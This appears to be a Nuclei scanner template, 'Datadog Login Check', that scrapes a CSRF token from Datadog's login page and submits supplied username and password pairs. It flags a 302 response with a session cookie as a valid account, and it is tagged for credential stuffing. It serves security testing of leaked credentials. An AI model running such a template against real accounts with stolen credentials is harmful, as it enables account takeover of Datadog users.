http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: auth_token
    part: body
    regex:
    - 'authentication_token&#34;: &#34;(.*?)&#34;,'
    type: regex
  - dsl:
    - username
    - password
    type: dsl
  matchers:
  - part: header
    type: word
    words:
    - 'Set-Cookie: dogweb='
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - 'GET https://app.datadoghq.com/account/login HTTP/1.1

    Host: app.datadoghq.com

    '
  - 'POST https://app.datadoghq.com/account/login? HTTP/1.1

    Host: app.datadoghq.com

    Content-Type: application/x-www-form-urlencoded


    _authentication_token={{auth_token}}&username={{username}}&password={{password}}

    '
id: datadog-login-check
info:
  author: parthmalhotra,pdresearch
  description: Checks for a valid datadog account.
  metadata:
    max-request: 2
  name: Datadog Login Check
  reference:
  - https://owasp.org/www-community/attacks/Credential_stuffing
  severity: critical
  tags: cloud,creds-stuffing,login-check,datadog,vuln
self-contained: true
